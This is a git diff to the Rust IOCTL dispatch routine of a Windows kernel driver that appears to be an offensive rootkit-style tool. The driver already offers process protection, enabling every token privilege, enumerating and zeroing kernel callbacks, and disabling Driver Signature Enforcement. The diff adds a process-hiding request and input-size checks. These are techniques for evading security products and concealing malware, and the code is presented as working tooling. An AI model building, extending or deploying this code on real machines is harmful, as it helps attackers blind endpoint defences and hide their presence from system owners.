@@ -19,8 +19,8 @@ use winapi::{km::wdm::IO_PRIORITY::IO_NO_INCREMENT, shared::ntstatus::{STATUS_BU
 use winapi::km::wdm::{DRIVER_OBJECT, IoCreateDevice, PDEVICE_OBJECT, IoCreateSymbolicLink, IRP_MJ, DEVICE_OBJECT, IRP, IoCompleteRequest, IoGetCurrentIrpStackLocation, IoDeleteSymbolicLink, IoDeleteDevice, DEVICE_TYPE};
 use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING, FALSE, NT_SUCCESS, TRUE};
 use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
-use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
-use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::find_psp_set_create_process_notify};
+use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
+use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::hide_process}};
 use crate::process::{protect_process, unprotect_process};
 use crate::string::create_unicode_string;
 use crate::token::enable_all_token_privileges;
@@ -104,6 +104,13 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
     match control_code {
         IOCTL_PROCESS_PROTECT_REQUEST => {
             log::info!("IOCTL_PROCESS_PROTECT_REQUEST");
+
+            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
+                status = STATUS_BUFFER_TOO_SMALL;
+                log::error!("STATUS_BUFFER_TOO_SMALL");
+                return complete_request(irp, status, information);
+            }
+
             let protect_process_status = protect_process(irp, stack);
            
             if NT_SUCCESS(protect_process_status) {
@@ -112,10 +119,18 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                 status = STATUS_SUCCESS;
             } else {
                 log::error!("Process protection failed");
+                status = STATUS_UNSUCCESSFUL;
             }
         },
         IOCTL_PROCESS_UNPROTECT_REQUEST => {
             log::info!("IOCTL_PROCESS_UNPROTECT_REQUEST");
+
+            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
+                status = STATUS_BUFFER_TOO_SMALL;
+                log::error!("STATUS_BUFFER_TOO_SMALL");
+                return complete_request(irp, status, information);
+            }
+
             let unprotect_process_status = unprotect_process(irp, stack);
            
             if NT_SUCCESS(unprotect_process_status) {
@@ -124,6 +139,7 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                 status = STATUS_SUCCESS;
             } else {
                 log::error!("Process unprotection failed");
+                status = STATUS_UNSUCCESSFUL;
             }
         },
         IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST => {
@@ -136,6 +152,7 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                 status = STATUS_SUCCESS;
             } else {
                 log::error!("Process token privileges failed");
+                status = STATUS_UNSUCCESSFUL;
             }
         },
         IOCTL_CALLBACKS_ENUM_REQUEST => {
@@ -159,8 +176,8 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
             }
 
             log::info!("Enumerate callbacks successful");
-            status = STATUS_SUCCESS;
             unsafe { ExFreePool(modules as u64) };
+            status = STATUS_SUCCESS;
         },
         IOCTL_CALLBACKS_ZERO_REQUEST => {
             log::info!("IOCTL_CALLBACKS_ZERO_REQUEST");
@@ -214,7 +231,7 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
             }
 
             let dse = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut DriverSignatureEnforcement };
-            let user_buffer = unsafe { irp.UserBuffer as *mut DriverSignatureEnforcement };
+            let user_buffer = irp.UserBuffer as *mut DriverSignatureEnforcement;
 
             if dse.is_null() {
                 status = STATUS_INVALID_PARAMETER;
@@ -238,6 +255,29 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
 
             information = size_of::<DriverSignatureEnforcement>();
             status = STATUS_SUCCESS;
+        },
+        IOCTL_PROCESS_HIDE_REQUEST => {
+            log::info!("IOCTL_PROCESS_HIDE_REQUEST");
+
+            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetProcess>() as u32 } {
+                status = STATUS_BUFFER_TOO_SMALL;
+                log::error!("STATUS_BUFFER_TOO_SMALL");
+                return complete_request(irp, status, information);
+            }
+
+            let target_process = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut TargetProcess };
+
+            let process_id = unsafe { (*target_process).process_id };
+            log::info!("Process ID: {:?}", process_id);
+
+            if let Ok(_result) = hide_process(process_id) {
+                log::info!("Hide process successful");
+                information = size_of::<TargetProcess>();
+                status = STATUS_SUCCESS;
+            } else {
+                log::error!("Hide process failed");
+                status = STATUS_UNSUCCESSFUL;
+            }
         },
         _ => {
             log::error!("Invalid IOCTL code");
